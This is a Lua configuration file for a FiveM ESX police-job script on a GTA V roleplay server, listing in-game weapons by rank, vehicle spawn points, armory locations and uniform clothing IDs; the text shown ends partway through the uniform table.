Config                            = {}

Config.DrawDistance               = 10.0 -- How close do you need to be for the markers to be drawn (in GTA units).
Config.MarkerType                 = {Cloakrooms = 20, Armories = 21, BossActions = 22, Vehicles = 36, Helicopters = 34}
Config.MarkerSize                 = {x = 1.5, y = 1.5, z = 0.5}
Config.MarkerColor                = {r = 50, g = 50, b = 204}

Config.EnablePlayerManagement     = true -- Enable if you want society managing.
Config.EnableArmoryManagement     = false
Config.EnableESXIdentity          = true -- Enable if you're using esx_identity.
Config.EnableESXOptionalneeds     = false -- Enable if you're using esx_optionalneeds
Config.EnableLicenses             = true -- Enable if you're using esx_license.

Config.EnableHandcuffTimer        = true -- Enable handcuff timer? will unrestrain player after the time ends.
Config.HandcuffTimer              = 10 * 60000 -- 10 minutes.

Config.EnableJobBlip              = true -- Enable blips for cops on duty, requires esx_society.
Config.EnableCustomPeds           = false -- Enable custom peds in cloak room? See Config.CustomPeds below to customize peds.

Config.EnableESXService           = false -- Enable esx service?
Config.MaxInService               = -1 -- How many people can be in service at once? Set as -1 to have no limit

Config.Locale = GetConvar('esx:locale', 'es')

Config.OxInventory                = ESX.GetConfig().OxInventory

Config.WashMoneyLocation = vec3(487.18, -986.8, 29.69)

Config.PoliceStations = {


	LSPD = {

		Accesories = {
			{label = "Silenciador", name = "at_suppressor_light", price = 0},
			{label = "Balas 9mm", name = "ammo-9", price = 100, quantity = 50}
		},

		Weapons = {
			-- @ LOW PFA
			[0] = { -- @ Recluta
				{label = "SMG", name = "WEAPON_SMG", price = 0, ammo = "ammo-9"},
				{label = "Pistola de combate", name = "weapon_combatpistol", price = 0, ammo = "ammo-9"},
				{label = "Pistola .50", name = "weapon_pistol50", price = 0, ammo = "ammo-50"},
				{label = "Porra", name = "weapon_nightstick", price = 0},
				{label = "Taser", name = "weapon_stungun", price = 0},
				{label = "Silenciador", name = "at_suppressor_light", price = 0}
			},

			[1] = { -- @ Aprendiz
				{label = "SMG", name = "WEAPON_SMG", price = 0, ammo = "ammo-9"},
				{label = "Pistola de combate", name = "weapon_combatpistol", price = 0, ammo = "ammo-9"},
				{label = "Pistola .50", name = "weapon_pistol50", price = 0, ammo = "ammo-50"},
				{label = "Porra", name = "weapon_nightstick", price = 0},
				{label = "Taser", name = "weapon_stungun", price = 0},
				{label = "Latas de humo", name = "weapon_smokegrenade", price = 0},
				{label = "Gas bz", name = "weapon_bzgas", price = 0},
				{label = "Silenciador", name = "at_suppressor_light", price = 0}
			},

			[2] = { -- @ Cabo
				{label = "SMG", name = "WEAPON_SMG", price = 0, ammo = "ammo-9"},
				{label = "Pistola de combate", name = "weapon_combatpistol", price = 0, ammo = "ammo-9"},
				{label = "Pistola .50", name = "weapon_pistol50", price = 0, ammo = "ammo-50"},
				{label = "Porra", name = "weapon_nightstick", price = 0},
				{label = "Taser", name = "weapon_stungun", price = 0},
				{label = "Latas de humo", name = "weapon_smokegrenade", price = 0},
				{label = "Latas de bz", name = "weapon_bzgas", price = 0},
				{label = "Silenciador", name = "at_suppressor_light", price = 0}
			},

			[3] = { -- @ Sargento
				{label = "SMG", name = "WEAPON_SMG", price = 0, ammo = "ammo-9"},
				{label = "SMG de Asalto", name = "weapon_assaultsmg", price = 0, ammo = "ammo-rifle"},
				{label = "Pistola de combate", name = "weapon_combatpistol", price = 0, ammo = "ammo-9"},
				{label = "Pistola .50", name = "weapon_pistol50", price = 0, ammo = "ammo-50"},
				{label = "Porra", name = "weapon_nightstick", price = 0},
				{label = "Taser", name = "weapon_stungun", price = 0},
				{label = "Latas de humo", name = "weapon_smokegrenade", price = 0},
				{label = "Latas de bz", name = "weapon_bzgas", price = 0},
				{label = "Silenciador", name = "at_suppressor_light", price = 0}
			},

			[4] = { -- @ Sargento 1
				{label = "SMG", name = "WEAPON_SMG", price = 0, ammo = "ammo-9"},
				{label = "SMG de Asalto", name = "weapon_assaultsmg", price = 0, ammo = "ammo-rifle"},
				{label = "Pistola de combate", name = "weapon_combatpistol", price = 0, ammo = "ammo-9"},
				{label = "Pistola .50", name = "weapon_pistol50", price = 0, ammo = "ammo-50"},
				{label = "Porra", name = "weapon_nightstick", price = 0},
				{label = "Taser", name = "weapon_stungun", price = 0},
				{label = "Latas de humo", name = "weapon_smokegrenade", price = 0},
				{label = "Latas de bz", name = "weapon_bzgas", price = 0},
				{label = "Silenciador", name = "at_suppressor_light", price = 0}
			},

			-- @ HIGH PFA

			[5] = { -- @ Oficial Mayor
				{label = "SMG", name = "WEAPON_SMG", price = 0, ammo = "ammo-9"},
				{label = "SMG de Asalto", name = "weapon_assaultsmg", price = 0, ammo = "ammo-rifle"},
				{label = "Pistola de combate", name = "weapon_combatpistol", price = 0, ammo = "ammo-9"},
				{label = "Pistola .50", name = "weapon_pistol50", price = 0, ammo = "ammo-50"},
				{label = "Porra", name = "weapon_nightstick", price = 0},
				{label = "Taser", name = "weapon_stungun", price = 0},
				{label = "Latas de humo", name = "weapon_smokegrenade", price = 0},
				{label = "Latas de bz", name = "weapon_bzgas", price = 0},
				{label = "Silenciador", name = "at_suppressor_light", price = 0}
			},

			[6] = { -- @ Sub Inspector
				{label = "SMG", name = "WEAPON_SMG", price = 0, ammo = "ammo-9"},
				{label = "SMG de Asalto", name = "weapon_assaultsmg", price = 0, ammo = "ammo-rifle"},
				{label = "Pistola de combate", name = "weapon_combatpistol", price = 0, ammo = "ammo-9"},
				{label = "Pistola .50", name = "weapon_pistol50", price = 0, ammo = "ammo-50"},
				{label = "Porra", name = "weapon_nightstick", price = 0},
				{label = "Taser", name = "weapon_stungun", price = 0},
				{label = "Latas de humo", name = "weapon_smokegrenade", price = 0},
				{label = "Latas de bz", name = "weapon_bzgas", price = 0},
				{label = "Silenciador", name = "at_suppressor_light", price = 0}
			},

			[7] = { -- @ Inspector
				{label = "SMG", name = "WEAPON_SMG", price = 0, ammo = "ammo-9"},
				{label = "SMG de Asalto", name = "weapon_assaultsmg", price = 0, ammo = "ammo-rifle"},
				{label = "Pistola de combate", name = "weapon_combatpistol", price = 0, ammo = "ammo-9"},
				{label = "Pistola .50", name = "weapon_pistol50", price = 0, ammo = "ammo-50"},
				{label = "Porra", name = "weapon_nightstick", price = 0},
				{label = "Taser", name = "weapon_stungun", price = 0},
				{label = "Latas de humo", name = "weapon_smokegrenade", price = 0},
				{label = "Latas de bz", name = "weapon_bzgas", price = 0},
				{label = "Silenciador", name = "at_suppressor_light", price = 0}
			},

			[8] = { -- @ Sub Comisario
				{label = "SMG", name = "WEAPON_SMG", price = 0, ammo = "ammo-9"},
				{label = "Micro SMG", name = "weapon_microsmg", price = 0, ammo = "ammo-45"},
				{label = "SMG de Asalto", name = "weapon_assaultsmg", price = 0, ammo = "ammo-rifle"},
				{label = "Pistola de combate", name = "weapon_combatpistol", price = 0, ammo = "ammo-9"},
				{label = "Pistola .50", name = "weapon_pistol50", price = 0, ammo = "ammo-50"},
				{label = "Porra", name = "weapon_nightstick", price = 0},
				{label = "Taser", name = "weapon_stungun", price = 0},
				{label = "Latas de humo", name = "weapon_smokegrenade", price = 0},
				{label = "Latas de bz", name = "weapon_bzgas", price = 0},
				{label = "Silenciador", name = "at_suppressor_light", price = 0}
			},

			[9] = { -- @ Comisario
				{label = "SMG", name = "WEAPON_SMG", price = 0, ammo = "ammo-9"},
				{label = "SMG de Asalto", name = "weapon_assaultsmg", price = 0, ammo = "ammo-rifle"},
				{label = "Tec 9", name = "weapon_machinepistol", price = 0, ammo = "ammo-9"},
				{label = "Pistola de combate", name = "weapon_combatpistol", price = 0, ammo = "ammo-9"},
				{label = "Pistola .50", name = "weapon_pistol50", price = 0, ammo = "ammo-50"},
				{label = "Porra", name = "weapon_nightstick", price = 0},
				{label = "Taser", name = "weapon_stungun", price = 0},
				{label = "Latas de humo", name = "weapon_smokegrenade", price = 0},
				{label = "Latas de bz", name = "weapon_bzgas", price = 0},
				{label = "Silenciador", name = "at_suppressor_light", price = 0}
			},

			-- @ HEAD PFA

			[10] = { -- @ Comisario Mayor
				{label = "SMG", name = "WEAPON_SMG", price = 0, ammo = "ammo-9"},
				{label = "Micro SMG", name = "weapon_microsmg", price = 0, ammo = "ammo-45"},
				{label = "SMG de Asalto", name = "weapon_assaultsmg", price = 0, ammo = "ammo-rifle"},
				{label = "Tec 9", name = "weapon_machinepistol", price = 0, ammo = "ammo-9"},
				{label = "Pistola de combate", name = "weapon_combatpistol", price = 0, ammo = "ammo-9"},
				{label = "Pistola .50", name = "weapon_pistol50", price = 0, ammo = "ammo-50"},
				{label = "Porra", name = "weapon_nightstick", price = 0},
				{label = "Taser", name = "weapon_stungun", price = 0},
				{label = "Latas de humo", name = "weapon_smokegrenade", price = 0},
				{label = "Latas de bz", name = "weapon_bzgas", price = 0},
				{label = "Silenciador", name = "at_suppressor_light", price = 0}
			},

			[11] = { -- @ Comisario General
				{label = "Carabina", name = "weapon_carbinerifle", price = 0, ammo = "ammo-rifle"},
				{label = "AK-47", name = "weapon_assaultrifle", price = 0, ammo = "ammo-rifle2"},
				{label = "SMG", name = "WEAPON_SMG", price = 0, ammo = "ammo-9"},
				{label = "Micro SMG", name = "weapon_microsmg", price = 0, ammo = "ammo-45"},
				{label = "SMG de Asalto", name = "weapon_assaultsmg", price = 0, ammo = "ammo-rifle"},
				{label = "Tec 9", name = "weapon_machinepistol", price = 0, ammo = "ammo-9"},
				{label = "Pistola de combate", name = "weapon_combatpistol", price = 0, ammo = "ammo-9"},
				{label = "Pistola .50", name = "weapon_pistol50", price = 0, ammo = "ammo-50"},
				{label = "Pistola AP", name = "weapon_appistol", price = 0, ammo = "ammo-9"},
				{label = "Porra", name = "weapon_nightstick", price = 0},
				{label = "Taser", name = "weapon_stungun", price = 0},
				{label = "Latas de humo", name = "weapon_smokegrenade", price = 0},
				{label = "Latas de bz", name = "weapon_bzgas", price = 0},
				{label = "Silenciador", name = "at_suppressor_light", price = 0}
			},

			[12] = { -- @ Sub Jefe
				{label = "Carabina", name = "weapon_carbinerifle", price = 0, ammo = "ammo-rifle"},
				{label = "AK-47", name = "weapon_assaultrifle", price = 0, ammo = "ammo-rifle2"},
				{label = "SMG", name = "WEAPON_SMG", price = 0, ammo = "ammo-9"},
				{label = "Micro SMG", name = "weapon_microsmg", price = 0, ammo = "ammo-45"},
				{label = "SMG de Asalto", name = "weapon_assaultsmg", price = 0, ammo = "ammo-rifle"},
				{label = "Tec 9", name = "weapon_machinepistol", price = 0, ammo = "ammo-9"},
				{label = "Pistola de combate", name = "weapon_combatpistol", price = 0, ammo = "ammo-9"},
				{label = "Pistola .50", name = "weapon_pistol50", price = 0, ammo = "ammo-50"},
				{label = "Pistola AP", name = "weapon_appistol", price = 0, ammo = "ammo-9"},
				{label = "Porra", name = "weapon_nightstick", price = 0},
				{label = "Taser", name = "weapon_stungun", price = 0},
				{label = "Latas de humo", name = "weapon_smokegrenade", price = 0},
				{label = "Latas de bz", name = "weapon_bzgas", price = 0},
				{label = "Silenciador", name = "at_suppressor_light", price = 0}
			},

			[13] = { -- @ Jefe
				{label = "Carabina", name = "weapon_carbinerifle", price = 0, ammo = "ammo-rifle"},
				{label = "AK-47", name = "weapon_assaultrifle", price = 0, ammo = "ammo-rifle2"},
				{label = "SMG", name = "WEAPON_SMG", price = 0, ammo = "ammo-9"},
				{label = "Micro SMG", name = "weapon_microsmg", price = 0, ammo = "ammo-45"},
				{label = "SMG de Asalto", name = "weapon_assaultsmg", price = 0, ammo = "ammo-rifle"},
				{label = "Tec 9", name = "weapon_machinepistol", price = 0, ammo = "ammo-9"},
				{label = "Pistola de combate", name = "weapon_combatpistol", price = 0, ammo = "ammo-9"},
				{label = "Pistola .50", name = "weapon_pistol50", price = 0, ammo = "ammo-50"},
				{label = "Pistola AP", name = "weapon_appistol", price = 0, ammo = "ammo-9"},
				{label = "Porra", name = "weapon_nightstick", price = 0},
				{label = "Taser", name = "weapon_stungun", price = 0},
				{label = "Latas de humo", name = "weapon_smokegrenade", price = 0},
				{label = "Latas de bz", name = "weapon_bzgas", price = 0},
				{label = "Silenciador", name = "at_suppressor_light", price = 0}
			}
		},

		
		Vehicles = {
			{
				Spawner = vec3(-1128.224121, -816.395630, 15.951660),
				SpawnCoords = vec3(-1104.0975, -795.3182, 18.4960),
				VehicleList = {
					{label = "PFA Camioneta", car = "pfa22"},
					{label = "PFA Blindado", car = "pfa31"},
					{label = "PFA Blindado2", car = "gurkharb"},
					{label = "PFA Moto", car = "motopdlc"},
					{label = "PFA Auto1", car = "pdlc"},
					{label = "PFA Auto2", car = "pdlc1"},
					{label = "PFA Auto3", car = "pdlc2"},
					{label = "PFA Auto4", car = "pdlc3"},
					{label = "PFA Auto5", car = "pdlc4"}, 
					{label = "PFA Camioneta", car = "sprinterpdlc"}, 
				

				}
			},
			{
				Spawner = vec3(-1127.4738, -840.6999, 19.3158),
				SpawnCoords = vec4(-1096.1943, -832.0980, 37.7008, 135.1337),
				VehicleList = {
					{label = "PFA Heli", car = "helipdlc"}, 
				}
			},		
		},

		Cloakrooms = {
			vec3(-1109.868164, -843.402222, 19.304810)
		},

		Armories = {
			vec3(-1108.1224, -845.1084, 19.3168)
		},

		BossActions = {
			vec3(-1106.558228, -847.002197, 19.304810)
		}

	}

}

Config.AuthorizedWeapons = {
	recruit = {
		{weapon = 'WEAPON_APPISTOL', components = {0, 0, 1000, 4000, nil}, price = 10000},
		{weapon = 'WEAPON_NIGHTSTICK', price = 0},
		{weapon = 'WEAPON_STUNGUN', price = 1500},
		{weapon = 'WEAPON_FLASHLIGHT', price = 80}
	},

	officer = {
		{weapon = 'WEAPON_APPISTOL', components = {0, 0, 1000, 4000, nil}, price = 10000},
		{weapon = 'WEAPON_ADVANCEDRIFLE', components = {0, 6000, 1000, 4000, 8000, nil}, price = 50000},
		{weapon = 'WEAPON_NIGHTSTICK', price = 0},
		{weapon = 'WEAPON_STUNGUN', price = 500},
		{weapon = 'WEAPON_FLASHLIGHT', price = 0}
	},

	sergeant = {
		{weapon = 'WEAPON_APPISTOL', components = {0, 0, 1000, 4000, nil}, price = 10000},
		{weapon = 'WEAPON_ADVANCEDRIFLE', components = {0, 6000, 1000, 4000, 8000, nil}, price = 50000},
		{weapon = 'WEAPON_PUMPSHOTGUN', components = {2000, 6000, nil}, price = 70000},
		{weapon = 'WEAPON_NIGHTSTICK', price = 0},
		{weapon = 'WEAPON_STUNGUN', price = 500},
		{weapon = 'WEAPON_FLASHLIGHT', price = 0}
	},

	lieutenant = {
		{weapon = 'WEAPON_APPISTOL', components = {0, 0, 1000, 4000, nil}, price = 10000},
		{weapon = 'WEAPON_ADVANCEDRIFLE', components = {0, 6000, 1000, 4000, 8000, nil}, price = 50000},
		{weapon = 'WEAPON_PUMPSHOTGUN', components = {2000, 6000, nil}, price = 70000},
		{weapon = 'WEAPON_NIGHTSTICK', price = 0},
		{weapon = 'WEAPON_STUNGUN', price = 500},
		{weapon = 'WEAPON_FLASHLIGHT', price = 0}
	},

	boss = {
		{weapon = 'WEAPON_APPISTOL', components = {0, 0, 1000, 4000, nil}, price = 10000},
		{weapon = 'WEAPON_ADVANCEDRIFLE', components = {0, 6000, 1000, 4000, 8000, nil}, price = 50000},
		{weapon = 'WEAPON_PUMPSHOTGUN', components = {2000, 6000, nil}, price = 70000},
		{weapon = 'WEAPON_NIGHTSTICK', price = 0},
		{weapon = 'WEAPON_STUNGUN', price = 500},
		{weapon = 'WEAPON_FLASHLIGHT', price = 0}
	}
}

Config.AuthorizedVehicles = {
	car = {
		recruit = {},

		officer = {
			{model = 'police3', price = 20000}
		},

		sergeant = {
			{model = 'policet', price = 18500},
			{model = 'policeb', price = 30500}
		},

		lieutenant = {
			{model = 'riot', price = 70000},
			{model = 'fbi2', price = 60000}
		},

		boss = {}
	},

	helicopter = {
		recruit = {},

		officer = {},

		sergeant = {},

		lieutenant = {
			{model = 'polmav', props = {modLivery = 0}, price = 200000}
		},

		boss = {
			{model = 'polmav', props = {modLivery = 0}, price = 100000}
		}
	}
}

Config.CustomPeds = {
	shared = {
		{label = 'Sheriff Ped', maleModel = 's_m_y_sheriff_01', femaleModel = 's_f_y_sheriff_01'},
		{label = 'Police Ped', maleModel = 's_m_y_cop_01', femaleModel = 's_f_y_cop_01'}
	},

	recruit = {},

	officer = {},

	sergeant = {},

	lieutenant = {},

	boss = {
		{label = 'SWAT Ped', maleModel = 's_m_y_swat_01', femaleModel = 's_m_y_swat_01'}
	}
}

Config.Uniforms = {

	recruit = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},

	aprendiz = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},

	Cadete = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},

	Cabo = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},

	Cabo1 = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},

	Sargento = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},
	Sargento1 = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},

	SubOficial = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},

	Oficial = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},



	OficialMayor = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},

	
	Teniente = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},

	Teniente1 = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},

	subinspector = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},

	inspector = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},

	InspectorMayor = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},

	InspectorGeneral = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},


	SubComisario = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},

	comisario = {
	    male = {
	        ['tshirt_1'] = 15,  ['tshirt_2'] = 0,
	        ['torso_1'] = 45,   ['torso_2'] = 0,
	        ['arms'] = 0,
	        ['pants_1'] = 87,   ['pants_2'] = 1,
	        ['shoes_1'] = 25,   ['shoes_2'] = 0,
	        ['bproof_1']=  20,   ['bproof_2'] = 0,
	    },
	    female = {
	        ['tshirt_1'] = 298,  ['tshirt_2'] = 0,
	        ['torso_1'] = 159,   ['torso_2'] = 0,
	        ['arms'] = 14,
	        ['pants_1'] = 117,   ['pants_2'] = 0,
	        ['shoes_1'] = 22,   ['shoes_2'] = 0,
	        ['bproof_1']=  15,      ['bproof_2'] = 0,
	    }
	},


	comisarioMayor = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},

	comisarioGeneral = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
			['torso_1'] = 159,   ['torso_2'] = 0,
			['arms'] = 14,
			['pants_1'] = 117,   ['pants_2'] = 0,
			['shoes_1'] = 22,   ['shoes_2'] = 0,
			['bproof_1']=  15,      ['bproof_2'] = 0,
		}
	},

	Coronel = {
		male = {
			['tshirt_1'] = 15,  ['tshirt_2'] = 0,
			['torso_1'] = 45,   ['torso_2'] = 0,
			['arms'] = 0,
			['pants_1'] = 87,   ['pants_2'] = 1,
			['shoes_1'] = 25,   ['shoes_2'] = 0,
			['bproof_1']=  20,   ['bproof_2'] = 0,
		},
		female = {
			['tshirt_1'] = 298,  ['tshirt_2'] = 0,
